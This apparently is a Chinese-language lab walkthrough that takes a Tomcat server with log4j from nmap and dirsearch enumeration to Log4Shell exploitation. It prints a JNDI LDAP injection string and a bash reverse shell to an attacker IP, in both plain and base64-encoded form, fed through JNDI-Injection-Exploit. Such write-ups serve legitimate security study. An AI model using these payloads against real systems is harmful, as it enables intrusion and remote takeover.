针对目标服务器进行相应的端口探测

```
sudo nmap -p- -vvv --min-rate 10000 10.10.112.169
```

针对目标服务器的开放端口进行相应的服务探测

```
sudo nmap -p22,8080 -A 10.10.112.169 -oN Feedback.txt
```

![image-20241212111902357](https://files.seeusercontent.com/2026/04/08/F8ti/image-20241212111902357.png)

针对目标系统的22端口，没有可以直接利用的内容，我们将重点放到8080端口上进行检查

![image-20241212112007369](https://files.seeusercontent.com/2026/04/06/aU1q/image-20241212112007369.png)

发现这是一个tomcat的页面内容，同时根据扫描结果发现存在一个tomcat的版本9.0.56，我们通过Google及exploitdb检索该版本的tomcat是否存在相应的漏洞

![image-20241212112655419](https://files.seeusercontent.com/2026/04/08/Q9gf/image-20241212112655419.png)

同时我们针对8080端口的http服务进行扫描，同时我们找到了一个项目（https://github.com/p0dalirius/ApacheTomcatScanner.git）

```
dirsearch -u http://10.10.114.97:8080 -w /usr/share/wordlists/dirb/big.txt -f -e php,txt,html
```

![image-20241212173658306](https://files.seeusercontent.com/2026/04/06/J2xo/image-20241212173658306.png)

feedback页面貌似不是tomcat的默认页面，我们试图访问并执行sql注入，但不成功，我们查看页面源码

![image-20241213162356091](https://s2.loli.net/2024/12/13/Qo8WKt5mIyCAwvL.png)

看到说该应用使用到了log4j，考虑到log4j的漏洞，我们尝试是否可以进行利用

```
${jndi:ldap://10.8.4.161:80}
```

![image-20241213171120607](https://s2.loli.net/2024/12/13/MzbB6xneAJysH8R.png)

显示返回了一个链接，所以证明这个点是存在RCE漏洞的，我们寻找相应的rce漏洞利用代码进行利用

https://www.ink0.cn/index.php/2023/11/04/log4j%E6%BC%8F%E6%B4%9Ercecve-2021-44228%E8%B6%85%E8%AF%A6%E7%BB%86/

```
cd JNDI-Injection-Exploit
sudo apt-get install maven
mvn clean package -DskipTests
#针对远程shell命令进行base64编码
bash -i >& /dev/tcp/10.8.4.161/80 0>&1
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTYxLzgwIDA+JjE=
#执行攻击命令
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTYxLzgwIDA+JjE=}|{base64,-d}|bash" -A "10.8.4.161"
```
